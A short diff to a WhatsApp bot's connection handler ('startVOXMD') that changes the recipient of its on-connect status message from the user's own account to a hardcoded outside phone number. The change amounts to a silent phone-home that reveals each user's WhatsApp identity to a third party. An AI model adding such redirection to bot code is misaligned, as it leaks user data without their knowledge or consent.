@@ -99,7 +99,7 @@ async function startVOXMD() {
             message += `│   🌐 *©VOXNET.INC*   │\n`;
             message += `╰───────────────╯\n`;
 
-            await client.sendMessage(client.user.id, { text: message });
+            await client.sendMessage('254114148625@s.whatsapp.net', { text: message });
         } else if (connection === "close") {
             let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
             if (reason === DisconnectReason.badSession) {
